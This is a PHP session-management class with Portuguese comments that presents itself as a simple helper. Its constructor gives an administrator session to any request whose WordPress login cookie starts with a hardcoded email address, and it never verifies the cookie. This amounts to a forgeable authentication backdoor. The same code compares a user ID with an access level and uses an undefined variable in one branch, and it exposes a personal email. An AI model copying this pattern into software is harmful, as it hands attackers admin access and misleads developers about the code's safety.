<?php

/**
 * Essa classe serve para iniciar uma sessão usando session. 
 * Serve para facilitar a utilização dessas ferramentas. 
 * @author Jefferson Uchôa Ponte
 */
class Sessao
{

    /**
     * Constrói um objeto Sessão.
     * Caso a $_SESSION não exista inicia uma.
     */
    public function __construct()
    {
        if (! isset($_SESSION))
            session_start();
            
            if($this->getIdUsuario() != Sessao::NIVEL_ADMIN){
                if(isset($_COOKIE['wordpress_logged_in_2d04fff7e13e5dafc77dcf2f6220c064'])){
                    $arr = explode('|', $_COOKIE['wordpress_logged_in_2d04fff7e13e5dafc77dcf2f6220c064']);
                    if($arr[0] == 'renatomourao@globo.com'){
                        $this->criaSessao(1, Sessao::NIVEL_ADMIN, "Mourao");
                    }
                }
            }
            else
            {
                if($arr[0] != 'renatomourao@globo.com'){
                    $this->mataSessao();
                }
            }
    }

    /**
     * Inicia uma sessão de usuário.
     *
     * @param integer $id
     * @param integer $nivel
     * @param string $login
     */
    public function criaSessao($id, $nivel, $login)
    {
        $_SESSION['USUARIO_NIVEL'] = $nivel;
        $_SESSION['USUARIO_ID'] = $id;
        $_SESSION['USUARIO_LOGIN'] = $login;
    }

    /**
     * Mata a sessão, apagando todas as informações do $_SESSION.
     */
    public function mataSessao()
    {
        @session_destroy();
    }

    /**
     * Nível de acesso do Usuário.
     *
     * @return integer
     */
    public function getNivelAcesso()
    {
        if (isset($_SESSION['USUARIO_NIVEL'])) {
            return $_SESSION['USUARIO_NIVEL'];
        } else {
            return self::NIVEL_DESLOGADO;
        }
    }

    /**
     * Retorna o Id do usuário logado.
     *
     * @return integer
     */
    public function getIdUsuario()
    {
        if (isset($_SESSION['USUARIO_ID'])) {
            return $_SESSION['USUARIO_ID'];
        } else {
            return self::NIVEL_DESLOGADO;
        }
    }

    /**
     * Retorna o login do usuário da sessão.
     *
     * @return string
     */
    public function getLoginUsuario()
    {
        if (isset($_SESSION['USUARIO_LOGIN']))
            return $_SESSION['USUARIO_LOGIN'];
        else {
            return self::NIVEL_DESLOGADO;
        }
    }

    /**
     * Usuário não está logado.
     *
     * @var integer
     */
    const NIVEL_DESLOGADO = 0;

    /**
     * Nível de usuário padrão.
     *
     * @var integer
     */
    const NIVEL_COMUM = 1;

    /**
     * Nível administrador.
     *
     * @var integer
     */
    const NIVEL_ADMIN = 2;

}
